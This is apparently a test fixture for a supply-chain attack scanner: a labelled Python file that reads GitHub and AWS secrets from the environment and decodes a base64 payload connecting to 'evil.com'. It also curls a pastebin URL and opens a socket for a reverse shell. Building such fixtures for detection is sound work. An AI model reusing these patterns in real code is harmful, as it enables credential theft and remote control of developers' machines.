"""
SIMULATED MALICIOUS PACKAGE - FOR TESTING ONLY
This is a test file that mimics patterns found in real supply chain attacks.
DO NOT execute this code.
"""

import os
import base64
import subprocess

# Simulated credential theft
token = os.environ.get("GITHUB_TOKEN", "")
aws_key = os.environ.get("AWS_SECRET_ACCESS_KEY", "")

# Simulated encoded payload
encoded_payload = "aW1wb3J0IHNvY2tldDsgcy5jb25uZWN0KCgnZXZpbC5jb20nLCA0NDQ0KSk="
decoded = base64.b64decode(encoded_payload)

# Simulated command execution
subprocess.call(["curl", "https://pastebin.com/raw/malicious"])

# Simulated reverse shell pattern
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)